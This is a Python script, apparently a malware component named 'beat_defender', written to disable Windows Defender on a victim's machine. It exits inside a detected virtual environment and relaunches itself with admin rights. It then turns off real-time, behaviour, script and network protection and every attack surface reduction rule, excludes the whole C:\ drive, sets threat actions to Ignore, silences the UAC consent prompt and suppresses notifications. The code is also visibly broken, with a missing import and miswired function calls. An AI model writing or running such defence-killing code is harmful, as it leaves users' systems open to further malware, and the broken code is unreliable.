import ctypes
import subprocess
import sys  # only lib needed


def bypass():

    def get_base_prefix_compat():  # define all of the checks
        return (getattr(sys, "base_prefix", None)
                or getattr(sys, "real_prefix", None) or sys.prefix)

    def in_virtualenv():
        return get_base_prefix_compat() != sys.prefix

    if in_virtualenv() == True:  # if we are in a vm
        sys.exit()  # exit


class beat_defender:

    def run(self):
        subprocess.run(["powershell", self], capture_output=False)

    def init(self):

        def is_admin():
            try:
                return ctypes.windll.shell32.IsUserAnAdmin()
            except:
                return False

        self.is_admin = is_admin()

    def exploit(self):
        if self:
            run("Set-MpPreference -PUAProtection Disabled")
            # run("Set-MpPreference -AllowDatagramProcessingOnWinServer False")
            # run("Set-MpPreference -AllowNetworkProtectionOnWinServer False")
            cwd = os.getcwd()
            run(f'Set-MpPreference -AttackSurfaceReductionOnlyExclusions "{cwd}"'
                )
            run("Set-MpPreference -AttackSurfaceReductionRules_Ids 56a863a9-875e-4185-98a7-b882c64b5ce5   -AttackSurfaceReductionRules_Actions Disabled"
                )
            run("Add-MpPreference -AttackSurfaceReductionRules_Ids 7674ba52-37eb-4a4f-a9a1-f0f9a1619a2c   -AttackSurfaceReductionRules_Actions Disabled"
                )
            run("Add-MpPreference -AttackSurfaceReductionRules_Ids d4f940ab-401b-4efc-aadc-ad5f3c50688a   -AttackSurfaceReductionRules_Actions Disabled"
                )
            run("Add-MpPreference -AttackSurfaceReductionRules_Ids 9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2   -AttackSurfaceReductionRules_Actions Disabled"
                )
            run("Add-MpPreference -AttackSurfaceReductionRules_Ids be9ba2d9-53ea-4cdc-84e5-9b1eeee46550   -AttackSurfaceReductionRules_Actions Disabled"
                )
            run("Add-MpPreference -AttackSurfaceReductionRules_Ids 01443614-cd74-433a-b99e-2ecdc07bfc25   -AttackSurfaceReductionRules_Actions Disabled"
                )
            run("Add-MpPreference -AttackSurfaceReductionRules_Ids 5beb7efe-fd9a-4556-801d-275e5ffc04cc   -AttackSurfaceReductionRules_Actions Disabled"
                )
            run("Add-MpPreference -AttackSurfaceReductionRules_Ids d3e037e1-3eb8-44c8-a917-57927947596d   -AttackSurfaceReductionRules_Actions Disabled"
                )
            run("Add-MpPreference -AttackSurfaceReductionRules_Ids 3b576869-a4ec-4529-8536-b80a7769e899   -AttackSurfaceReductionRules_Actions Disabled"
                )
            run("Add-MpPreference -AttackSurfaceReductionRules_Ids 75668c1f-73b5-4cf0-bb93-3ecf5cb7cc84   -AttackSurfaceReductionRules_Actions Disabled"
                )
            run("Add-MpPreference -AttackSurfaceReductionRules_Ids 26190899-1602-49e8-8b27-eb1d0a1ce869   -AttackSurfaceReductionRules_Actions Disabled"
                )
            run("Add-MpPreference -AttackSurfaceReductionRules_Ids e6db77e5-3df2-4cf1-b95a-636979351e5b   -AttackSurfaceReductionRules_Actions Disabled"
                )
            run("Add-MpPreference -AttackSurfaceReductionRules_Ids d1e49aac-8f56-4280-b9ba-993a6d77406c   -AttackSurfaceReductionRules_Actions Disabled"
                )
            run("Add-MpPreference -AttackSurfaceReductionRules_Ids b2b3f03d-6a65-4f7b-a9c7-1c7ef74a9ba4   -AttackSurfaceReductionRules_Actions Disabled"
                )
            run("Add-MpPreference -AttackSurfaceReductionRules_Ids 92e97fa1-2edf-4476-bdd6-9dd0b4dddc7b   -AttackSurfaceReductionRules_Actions Disabled"
                )
            run("Add-MpPreference -AttackSurfaceReductionRules_Ids c1db55ab-c21a-4637-bb3f-a12568109d35  -AttackSurfaceReductionRules_Actions Disabled"
                )
            run("Set-MpPreference -CheckForSignaturesBeforeRunningScan 0")
            run("Set-MpPreference -CloudBlockLevel 0")
            run(f'Set-MpPreference -ControlledFolderAccessAllowedApplications "{cwd}'
                + '\setup.exe"')
            run("Set-MpPreference -ControlledFolderAccessProtectedFolders []")
            run("Set-MpPreference -DisableArchiveScanning 1")
            run("Set-MpPreference -DisableAutoExclusions 1")
            run("Set-MpPreference -DisableBehaviorMonitoring 1")
            run("Set-MpPreference -DisableBlockAtFirstSeen 1")
            run("Set-MpPreference -DisableCatchupFullScan 1")
            run("Set-MpPreference -DisableCatchupQuickScan 1")
            # run('Set-MpPreference -DisableDatagramProcessing 1')
            # run('Set-MpPreference -DisableDnsOverTcpParsing 1')
            # run('Set-MpPreference -DisableDnsParsing 1')
            run("Set-MpPreference -DisableEmailScanning 1")
            # run('Set-MpPreference -DisableHttpParsing 1')
            # run('Set-MpPreference -DisableInboundConnectionFiltering 1')
            run("Set-MpPreference -DisableIntrusionPreventionSystem 1")
            run("Set-MpPreference -DisableIOAVProtection 1")
            run("Set-MpPreference -DisablePrivacyMode 1")
            # run('Set-MpPreference -DisableRdpParsing 1')
            run("Set-MpPreference -DisableRealtimeMonitoring 1")
            run("Set-MpPreference -DisableRemovableDriveScanning 1")
            run("Set-MpPreference -DisableRestorePoint 1")
            run("Set-MpPreference -DisableScanningMappedNetworkDrivesForFullScan 1"
                )
            run("Set-MpPreference -DisableScanningNetworkFiles 1")
            run("Set-MpPreference -DisableScriptScanning 1")
            # run('Set-MpPreference -DisableSshParsing 1')
            # run('Set-MpPreference -DisableTlsParsing 1')
            run("Set-MpPreference -EnableControlledFolderAccess Disabled")
            run("Set-MpPreference -EnableFileHashComputation 0")
            run("Set-MpPreference -EnableLowCpuPriority 0")
            run("Set-MpPreference -EnableNetworkProtection Disabled")
            run("Set-MpPreference -ExclusionExtension exe")
            run("Set-MpPreference -ExclusionPath C:\\")
            # run('Set-MpPreference -ExclusionProcess []')
            run("Set-MpPreference -HighThreatDefaultAction Ignore")
            run("Set-MpPreference -LowThreatDefaultAction Ignore")
            run("Set-MpPreference -MAPSReporting 0")
            run("Set-MpPreference -ModerateThreatDefaultAction Ignore")
            run("Set-MpPreference -ScanAvgCPULoadFactor 1")
            run("Set-MpPreference -ScanOnlyIfIdleEnabled 0")
            run("Set-MpPreference -ScanParameters 1")
            run("Set-MpPreference -ScanScheduleDay 8")
            run("Set-MpPreference -SevereThreatDefaultAction Ignore")
            run("Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine 1"
                )
            run("Set-MpPreference -SignatureScheduleDay 8")
            # run('Set-MpPreference -SignaturesUpdatesChannel NotConfigured')
            run("Set-MpPreference -SubmitSamplesConsent 2")
            run("Set-MpPreference -UILockdown 1")
            run("Set-MpPreference -UnknownThreatDefaultAction  Allow")
            run("Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name ConsentPromptBehaviorAdmin -Value 0"
                )
            run("Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\UX Configuration  -Name Notification_Suppress -Value 1"
                )
        else:
            # Re-run the program with admin rights
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable,
                                                "", None, 1)
